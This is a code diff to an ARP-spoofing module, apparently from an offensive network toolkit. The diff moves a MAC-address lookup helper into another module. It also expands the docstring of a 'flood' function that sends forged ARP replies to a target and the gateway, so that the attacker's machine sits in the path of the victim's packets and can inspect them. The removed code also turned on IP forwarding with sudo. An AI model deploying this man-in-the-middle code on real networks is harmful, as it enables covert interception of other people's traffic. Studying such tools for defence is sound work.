+++ tools/L2/arp-spoof.py
@@ -1,38 +1,13 @@
-import os
-from functools import cache
+"""This module provides the flood function for an ARP-Spoof attack."""
+
 from time import sleep
 
 from colorama import Fore as F
 from getmac import get_mac_address as __get_host_mac
-from scapy.all import send, srp
-from scapy.layers.l2 import ARP, Ether
+from scapy.all import send
+from scapy.layers.l2 import ARP
 
-from tools.addons.ip_tools import __get_local_host_ips
-
-
-@cache
-def __get_mac(target: str) -> str:
-    """Get the MAC address of the target.
-
-    Args:
-        - target - The target that we want to get the MAC address
-
-    Returns:
-        - mac_addr - The MAC address itself
-    """
-    os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
-    while True:
-        try:
-            arp_request = ARP(pdst=target)
-            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-            packet = broadcast / arp_request
-            ans = srp(packet, timeout=5, verbose=False)[0]
-            mac_addr = ans[0][1].hwsrc
-        except IndexError:
-            continue
-        else:
-            return mac_addr
-
+from tools.addons.ip_tools import __get_local_host_ips, __get_mac
 
 GATEWAY_IP = __get_local_host_ips()[0]
 GATEWAY_MAC = __get_mac(GATEWAY_IP)
@@ -41,6 +16,10 @@ HOST_MAC = __get_host_mac()
 
 def flood(target: str) -> None:
     """Start sending modified ARP requests to the target and the gateway.
+    Now, all packets sent by the target will pass through our machine, and
+    then it'll be forward sent to the gateway. That way, the attacker can
+    use a raw packet analyzer to inspect the victims packets before sending
+    them to the gateway.
 
     Args:
         - target - The target that will have its ARP table modified
